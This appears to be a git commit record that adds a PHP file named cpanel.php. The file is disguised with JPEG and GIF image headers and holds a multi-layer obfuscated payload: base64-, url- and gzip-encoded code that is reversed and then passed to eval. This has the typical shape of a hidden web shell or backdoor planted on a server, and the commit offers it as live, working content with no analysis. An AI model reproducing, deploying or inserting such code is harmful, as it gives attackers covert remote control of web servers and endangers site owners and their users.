b8490ef5e3762ba3adaba4a0800c6e92f7135a99
mr-quixter <77615861+mr-quixter@users.noreply.github.com>
2021-11-04 02:48:23 +0700

    Rename cpanel.php7 to cpanel.php

---
+++ cpanel.php
@@ -0,0 +1,23 @@
+����JFIF��;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 90
+��C
+
+
+
+
+��C		
+
+��PP"��	
+���}!1AQa"q2���#B��R��$3br�	
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������	
+���w!1AQaq"2�B����	#3R�br�
+$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?�"�E�x�}�^�L2[G����'�-�v��EIƜy�Tc�rO��-okZڳG�=_�Z�$�i=���7���m#,1����ר�B�Z~1^t�2:}�O�)��9�\+o6�a����B�u��W�ףNq�c�Q�
+(������R�@{��K
+�H�uQTW����W{5{�����]���ݮ_�7�[��+��+^D���}�FS^^�}�X�m���@�W��23+.�_�j��}����QEw��)�R��KY��u����[����"u�5a�)�_>W�|;�E�"��n�6�ŉ���oI�eQ^y�E+�Q�1������ڮ�����3W��D�E��%M�=��:�:�0��y�j�(���0�G����@��_�m'��҆>_��e?�ܻ�j����h��D/�sp�۟�m��.Zf����𥢊���*4��VjX�f��Q��ͻ�e�+�^��F[�ܤeͻܿ{o�W�W�BW�c���?�4�WI��m溑c�6�F���j��ڕ��.�Y'�_3�5��F�c�ۈl���l|���>�Ҽ��d��4���_iz.�>���3WB8�"��\��#p��)��絯iz��"��?+WEI�MI��ɵo�ڕ�f�)z�����\���Z���E"��e���7AY���c�[�����1�/ѫ��}��T����GIF89a=<!DOCTYPE html>
+<?php
+/* Memek pink
+*/
+$Cyber = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRDcmltZSUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
+$Crime = "=whESNwD0r2iqzND/wa2COt/NeZXrnorYyxJn253EF3rzWG9aSeXDzjouHR6Wf4B7n9HdIWfBCszJKhkCrb39XTc4xclxeP3HMc7dTyHDWf7GxqaMhb2hVxyiKcbWsEGRNsJL5IZ61SBLBAFsUzoOUS8R4JMDoN0vnE4axI0UMjSpdBOscfYWiHV0DKWLVwB5xa9g5W1sLT4+vv/Gc14d4Hw4gipQVUCZNouZc48QjTll8K7JdBhcUtZUF1qeikHtAMvelPrXPzbxP7UNOy2ffoX6v7gCHEZAtsHiPVto/4elm0xA8JjfDgH9JP9QMjomXPbUL90Vb0TfD3Um68nBynvfNpZEE/smKR65D3TLfc2pTuN1VrgSacra2U6bWDyZ7iZbpZ35ekEj5BwsWh3Bi8dA3zMHqnQIINlju9GJW0sjZvzeP+UutP15tSvJ45/w6pIfEvQowwcH2edObXcrAbVAvNPpGlQ7SuN5cJMJ3UWoWH9F0i2ykaSwqXd+msgVZiL6aUbPDbNu4kcxv7fzv319OxaDKGiQeFN/0xC9h26fXVirYk7SHrgeDTkkVedm0TTtVTQHADwPE2OYwKzkiFzzYdWIH5G1GrYQnDiQDGN2oZmavxa5XdqqmFUy3q3GP82dj7xGM6Gxb0v7c7pzGIe0HB5pFViLu4szb8z/854mMT2sFL1pFzg2N+Mn+5DzftZM7TM5yTd5zDd53trGt8m7d7TvRWwlduNQrROpKYwg7nte9ObtzievBz7DY43cQu19fKdJAhtwsWkUvdZI17tORmvLkSQFI3jmI29hNxlWXiTFZmkTh+v2fzU77w6UY5nftiW5+k0LqrOBqrgA+q4dS2kjEeLVE83YhM9hRwiWgWMILn+oh8JuAtTV5GvSX4FkoXEiVDsEcTkmXUxDAkpCZE4DMDtUumq2sbJ2dAl5Knsb8vdH9kWeaxog47RwvWb6SIf4BXf5OvMYi8Mi/BaAuXT0ETYXSEeZowRzKKPoQLJQcxT+UBp5oo5qYeygGHvTIfOb6XFZRGe4pqHrgjSWiZg1aYvcdX+K+dD/VN/U1fO9FNKHj9Abc6PF2L+8/tt3wuXPJtiQcP5cGSrNOizKRovDJn25IDqA62A2P6lZLoqO6aK60Mcx46aA6GVlbLCkZWIGy5+dTuSJ5ZyJhPDGLdJo81Ka+9KMkVeNUi9MZoQ43mFkfCllSIeRW4Gq6VWg3y+CrNfqYxJNu2jQE7EGINfNxhsoELZath9WUGFFCZMwzLHPELO6St54LXEiUgHIC/DE+FJGq5+EsZRiD7enlm5M0x7KzDP1I2LMS8As5OPVINUDuVlq4RoRBleJCIl/HFVvmigKjpgHUUty0L2iyznQBEjk3znVLTxy4ic98ikPz++KXJiRxUpLUlmNXHNjBzk+8w5Bw20qjVT1M8fHAXauAXJMOtn0xWJcVFw2iQ4jGDuRMpSxiLYWAyyB/8a9YxzVEicJPHklaSbdeIOy/Ouud3+cyMkLRVqV1F4nAwZ9+pS005gOYYAmCGw1EpRtbV7RurtRtbc20G414OQaLNOIl90HmHSd6PFGNqbrbVrci3+aRQpBsfVEoaA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
+exit;
+?>
